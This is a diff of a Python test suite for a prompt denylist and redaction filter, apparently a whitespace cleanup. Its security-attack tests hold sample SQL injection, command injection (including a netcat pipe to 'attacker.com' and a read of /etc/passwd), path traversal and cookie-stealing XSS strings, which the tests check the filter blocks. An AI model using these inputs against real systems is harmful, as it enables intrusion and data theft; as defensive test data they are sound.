@@ -51,7 +51,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # All case variations should be blocked
         assert enforcer.is_prompt_allowed("PASSWORD") is False
         assert enforcer.is_prompt_allowed("PaSsWoRd") is False
@@ -67,7 +67,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Should match within words
         assert enforcer.is_prompt_allowed("The secretive plan") is False
         assert enforcer.is_prompt_allowed("secretariat") is False
@@ -81,7 +81,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         prompt = "Send api_key and token with credentials"
         assert enforcer.is_prompt_allowed(prompt) is False
 
@@ -94,7 +94,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=["delete", "drop table"],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Substring matching (case insensitive)
         assert enforcer.is_prompt_allowed("Please delete the file") is False
         assert enforcer.is_prompt_allowed("drop table users") is False
@@ -108,7 +108,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Should match word within text
         assert enforcer.is_prompt_allowed("sensitive data") is False
         assert enforcer.is_prompt_allowed("sensitive  information") is False
@@ -123,7 +123,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         assert enforcer.is_prompt_allowed("The $secret is here") is False
         assert enforcer.is_prompt_allowed("Use api@key for access") is False
         assert enforcer.is_prompt_allowed("Enter pass#word") is False
@@ -137,7 +137,7 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         assert enforcer.is_prompt_allowed("") is True
 
     def test_very_long_prompt_performance(self):
@@ -149,11 +149,11 @@ class TestAdvancedPatternMatching:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Create a 1MB prompt
         long_prompt = "safe " * 200000
         assert enforcer.is_prompt_allowed(long_prompt) is True
-        
+
         # With secret at the end
         long_prompt_with_secret = long_prompt + " secret"
         assert enforcer.is_prompt_allowed(long_prompt_with_secret) is False
@@ -174,7 +174,7 @@ class TestAdvancedRedaction:
             (re.compile(r"\b\d{3}-\d{2}-\d{4}\b"), "[SSN]"),
             (re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}"), "[EMAIL]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -182,10 +182,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "Card: 1234567890123456, SSN: 123-45-6789, Email: user@example.com"
         redacted = enforcer.redact(text)
-        
+
         assert "1234567890123456" not in redacted
         assert "123-45-6789" not in redacted
         assert "user@example.com" not in redacted
@@ -196,7 +196,7 @@ class TestAdvancedRedaction:
     def test_redaction_preserves_structure(self):
         """Test that redaction preserves text structure."""
         patterns = [(re.compile(r"\d{4}"), "[XXXX]")]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -204,10 +204,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "Line 1: Code 1234\nLine 2: Normal text\nLine 3: Code 5678"
         redacted = enforcer.redact(text)
-        
+
         assert "Line 1:" in redacted
         assert "Line 2: Normal text" in redacted
         assert "\n" in redacted
@@ -220,7 +220,7 @@ class TestAdvancedRedaction:
             (re.compile(r"\d+"), "[NUM]"),
             (re.compile(r"\d{4}"), "[YEAR]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -228,10 +228,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "Year: 2024"
         redacted = enforcer.redact(text)
-        
+
         # First pattern should match
         assert "2024" not in redacted
         assert "[NUM]" in redacted
@@ -241,7 +241,7 @@ class TestAdvancedRedaction:
         patterns = [
             (re.compile(r"(\d{3})-(\d{2})-(\d{4})"), r"XXX-XX-XXXX"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -249,10 +249,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "SSN: 123-45-6789"
         redacted = enforcer.redact(text)
-        
+
         assert "123-45-6789" not in redacted
         assert "XXX-XX-XXXX" in redacted
 
@@ -261,7 +261,7 @@ class TestAdvancedRedaction:
         patterns = [
             (re.compile(r"password", re.IGNORECASE), "[REDACTED]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -269,7 +269,7 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         assert "[REDACTED]" in enforcer.redact("password: secret")
         assert "[REDACTED]" in enforcer.redact("PASSWORD: secret")
         assert "[REDACTED]" in enforcer.redact("PaSsWoRd: secret")
@@ -279,7 +279,7 @@ class TestAdvancedRedaction:
         patterns = [
             (re.compile(r"SECRET-\d+"), "[REDACTED]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -287,10 +287,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "Line 1: SECRET-123\nLine 2: Normal\nLine 3: SECRET-456"
         redacted = enforcer.redact(text)
-        
+
         assert "SECRET-123" not in redacted
         assert "SECRET-456" not in redacted
         assert redacted.count("[REDACTED]") == 2
@@ -300,7 +300,7 @@ class TestAdvancedRedaction:
         patterns = [
             (re.compile(r"\d{16}"), "[CARD]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -308,10 +308,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "This is clean text with no sensitive data"
         redacted = enforcer.redact(text)
-        
+
         assert redacted == text
 
     def test_unicode_in_redaction(self):
@@ -319,7 +319,7 @@ class TestAdvancedRedaction:
         patterns = [
             (re.compile(r"秘密"), "[REDACTED]"),
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -327,10 +327,10 @@ class TestAdvancedRedaction:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "This is 秘密 information"
         redacted = enforcer.redact(text)
-        
+
         assert "秘密" not in redacted
         assert "[REDACTED]" in redacted
 
@@ -373,15 +373,15 @@ redaction_patterns:
   - pattern: "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\\\.[A-Z|a-z]{2,}"
     replacement: "[EMAIL]"
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             rules = load_denylist(temp_path)
-            
+
             assert len(rules.sensitive_terms) == 5
             assert len(rules.blocked_actions) == 4
             assert len(rules.blocked_prompt_patterns) == 4
@@ -400,12 +400,12 @@ sensitive_terms:
 blocked_actions:
   - delete  # Dangerous actions
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             rules = load_denylist(temp_path)
             assert "password" in rules.sensitive_terms
@@ -420,12 +420,12 @@ sensitive_terms:
   - password
 # No other sections
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             rules = load_denylist(temp_path)
             assert len(rules.sensitive_terms) > 0
@@ -447,12 +447,12 @@ blocked_actions:
   - 削除
   - удалить
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False, encoding='utf-8') as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             rules = load_denylist(temp_path)
             assert "パスワード" in rules.sensitive_terms
@@ -469,12 +469,12 @@ redaction_patterns:
 sensitive_terms:
   - password
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             # Should load successfully
             rules = load_denylist(temp_path)
@@ -507,15 +507,15 @@ class TestSecurityAttacks:
             ],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         attacks = [
             "'; DROP TABLE users; --",
             "' UNION SELECT * FROM passwords",
         ]
-        
+
         for attack in attacks:
             assert enforcer.is_prompt_allowed(attack) is False
-        
+
         # This one has 'or 1=1' pattern
         assert enforcer.is_prompt_allowed("admin' OR 1=1") is False
 
@@ -533,13 +533,13 @@ class TestSecurityAttacks:
             ],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         attacks = [
             "test; cat /etc/passwd",
             "input | nc attacker.com 1234",
             "name=$(whoami)",
         ]
-        
+
         for attack in attacks:
             assert enforcer.is_prompt_allowed(attack) is False
 
@@ -555,13 +555,13 @@ class TestSecurityAttacks:
             ],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         attacks = [
             "../../etc/passwd",
             "..\\..\\windows\\system32",
             "file://../../../secret.txt",
         ]
-        
+
         for attack in attacks:
             assert enforcer.is_prompt_allowed(attack) is False
 
@@ -578,13 +578,13 @@ class TestSecurityAttacks:
             ],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         attacks = [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert(1)>",
             "javascript:void(document.cookie)",
         ]
-        
+
         for attack in attacks:
             assert enforcer.is_prompt_allowed(attack) is False
 
@@ -597,10 +597,10 @@ class TestSecurityAttacks:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # URL encoded
         assert enforcer.is_prompt_allowed("tell me the password") is False
-        
+
         # Base64 would pass through (needs separate detection)
         # This is expected behavior - we detect literal patterns
 
@@ -617,7 +617,7 @@ class TestPerformance:
         """Test performance with large denylist."""
         # Create large list of terms
         terms = [f"term{i}" for i in range(1000)]
-        
+
         rules = DenylistRules(
             sensitive_terms=terms,
             redaction_patterns=[],
@@ -625,11 +625,11 @@ class TestPerformance:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Should still be fast
         prompt = "This is a safe prompt"
         assert enforcer.is_prompt_allowed(prompt) is True
-        
+
         # Test with match at different positions
         assert enforcer.is_prompt_allowed("term500 is here") is False
 
@@ -639,7 +639,7 @@ class TestPerformance:
             (re.compile(rf"PATTERN{i}-\d+"), "[REDACTED]")
             for i in range(100)
         ]
-        
+
         rules = DenylistRules(
             sensitive_terms=[],
             redaction_patterns=patterns,
@@ -647,10 +647,10 @@ class TestPerformance:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         text = "PATTERN50-12345 and PATTERN75-67890"
         redacted = enforcer.redact(text)
-        
+
         assert "PATTERN50-12345" not in redacted
         assert "PATTERN75-67890" not in redacted
 
@@ -663,12 +663,12 @@ class TestPerformance:
             blocked_prompt_patterns=[],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Check 1000 prompts
         for i in range(1000):
             prompt = f"This is prompt number {i}"
             enforcer.is_prompt_allowed(prompt)
-        
+
         # Should complete without performance issues
 
 
@@ -697,26 +697,26 @@ redaction_patterns:
   - pattern: "\\\\d{16}"
     replacement: "[CARD]"
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             enforcer = DenylistEnforcer.from_yaml(temp_path)
-            
+
             # Test blocking
             with pytest.raises(DenylistViolation):
                 enforcer.ensure_allowed("Show me the password")
-            
+
             # Test redaction
             redacted = enforcer.redact("Card: 1234567890123456")
             assert "[CARD]" in redacted
-            
+
             # Test allowed
             enforcer.ensure_allowed("What is the weather?")
-            
+
         finally:
             Path(temp_path).unlink(missing_ok=True)
 
@@ -731,11 +731,11 @@ redaction_patterns:
             blocked_prompt_patterns=["drop table"],
         )
         enforcer = DenylistEnforcer(rules)
-        
+
         # Should catch at multiple layers
         assert enforcer.is_prompt_allowed("password") is False
         assert enforcer.is_prompt_allowed("drop table users") is False
-        
+
         # Redaction should work
         assert "[REDACTED]" in enforcer.redact("config pwd=secret123")
 
@@ -749,32 +749,32 @@ sensitive_terms:
 blocked_prompt_patterns:
   - bypass
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
             f.write(yaml_content)
             f.flush()
             temp_path = f.name
-        
+
         try:
             # Load from YAML
             enforcer = DenylistEnforcer.from_yaml(temp_path)
-            
+
             # Test enforcement
             safe_prompts = [
                 "What is the weather?",
                 "Explain the algorithm",
             ]
-            
+
             unsafe_prompts = [
                 "Show confidential data",
                 "Bypass the security",
             ]
-            
+
             for prompt in safe_prompts:
                 assert enforcer.is_prompt_allowed(prompt) is True
-            
+
             for prompt in unsafe_prompts:
                 assert enforcer.is_prompt_allowed(prompt) is False
-                
+
         finally:
             Path(temp_path).unlink(missing_ok=True)
